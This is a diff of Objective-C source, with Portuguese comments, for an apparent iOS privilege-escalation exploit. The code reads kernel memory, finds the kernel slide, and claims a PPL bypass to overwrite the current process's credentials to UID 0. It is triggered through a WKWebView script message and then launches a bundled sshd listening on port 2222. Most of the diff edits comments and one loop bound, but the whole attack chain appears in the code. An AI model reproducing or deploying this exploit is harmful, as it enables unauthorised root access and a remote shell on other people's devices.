@@ -3,7 +3,7 @@
 #import <spawn.h>
 #import <sys/stat.h>
 
-// APIs do Kernel
+// APIs do Kernel (Privadas)
 extern kern_return_t mach_vm_read_overwrite(vm_map_t, mach_vm_address_t, mach_vm_size_t, mach_vm_address_t, mach_vm_size_t *);
 extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, mach_vm_address_t, int, mach_port_t, memory_object_offset_t, boolean_t, vm_prot_t, vm_prot_t, vm_inherit_t);
 
@@ -19,7 +19,7 @@ extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, 
     return (kr == KERN_SUCCESS) ? val : 0xDEADBEEF;
 }
 
-// 2. ESCRITA FÍSICA (PPL/PTE Bypass) - Necessário para Mudar o UID
+// 2. ESCRITA FÍSICA (PPL/PTE Bypass) - Para mudar o UID
 - (void)ppl_write_race:(uint64_t)vaddr value:(uint64_t)val {
     uint64_t slide = [self getKernelSlide];
     uint64_t ttbr1_ptr = 0xFFFFFFF007004000 + slide + 0x8E10000;
@@ -38,7 +38,7 @@ extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, 
 // 3. BUSCA DO KERNEL SLIDE (A13)
 - (uint64_t)getKernelSlide {
     if (_kernel_slide != 0) return _kernel_slide;
-    for (uint64_t i = 0; i < 0x80000; i++) {
+    for (uint64_t i = 0; i < 0x100000; i++) {
         uint64_t addr = 0xFFFFFFF007004000 + (i * 0x4000);
         if (([self kread64:addr] & 0xFFFFFFFF) == 0xfeedfacf) {
             _kernel_slide = (i * 0x4000);
@@ -48,7 +48,7 @@ extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, 
     return 0;
 }
 
-// 4. TRIGGER NATIVO: ESCALADA -> ROOT -> SSHD
+// 4. TRIGGER: ESCALADA ROOT -> SPAWN SSHD
 - (void)userContentController:(WKUserContentController *)userContentController 
       didReceiveScriptMessage:(WKScriptMessage *)message 
                  replyHandler:(void (^)(id _Nullable reply, NSString * _Nullable errorMessage))replyHandler {
@@ -62,7 +62,7 @@ extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, 
             pid_t my_pid = getpid();
             uint64_t my_ucred = 0;
 
-            // Busca o processo atual
+            // Busca o processo atual na lista
             while (proc != 0 && proc != 0xDEADBEEF) {
                 if ((pid_t)[self kread64:(proc + 0x60)] == my_pid) {
                     my_ucred = [self kread64:(proc + 0xD8)];
@@ -71,12 +71,11 @@ extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, 
                 proc = [self kread64:proc];
             }
 
-            // ESCALADA PARA ROOT (UID 0)
+            // APLICA O PATCH DE ROOT (UID 0)
             if (my_ucred != 0) {
                 [self ppl_write_race:(my_ucred + 0x18) value:0]; 
             }
 
-            // VOLTA PARA A MAIN THREAD PARA SPAWN E RESPOSTA
             dispatch_async(dispatch_get_main_queue(), ^{
                 NSString *sshdPath = [[NSBundle mainBundle] pathForResource:@"sshd" ofType:nil];
                 pid_t pid = 0;
@@ -85,9 +84,9 @@ extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, 
 
                 if (sshdPath) {
                     const char *cPath = [sshdPath UTF8String];
-                    chmod(cPath, 0755); // Garante bit de execução
+                    chmod(cPath, 0755); // Ativa bit de execução
                     
-                    // -D: Não daemonize | -p 2222: Porta customizada
+                    // -D: No-daemon | -p 2222: Porta de escuta
                     char *const args[] = {(char *)cPath, "-D", "-p", "2222", NULL};
                     spawn_err = posix_spawn(&pid, cPath, NULL, NULL, args, NULL);
                 }
@@ -95,8 +94,8 @@ extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, 
                 replyHandler(@{
                     @"status": @"SUCCESS",
                     @"slide": [NSString stringWithFormat:@"0x%llx", slide],
-                    @"uid": @(current_uid), // Se for 501, a escalada falhou
-                    @"pid": @(pid),         // Se for 0, o ldid/sign falhou
+                    @"uid": @(current_uid),
+                    @"pid": @(pid),
                     @"info": (spawn_err == 0) ? @"SSHD ON" : [NSString stringWithFormat:@"Err:%d", spawn_err]
                 }, nil);
             });
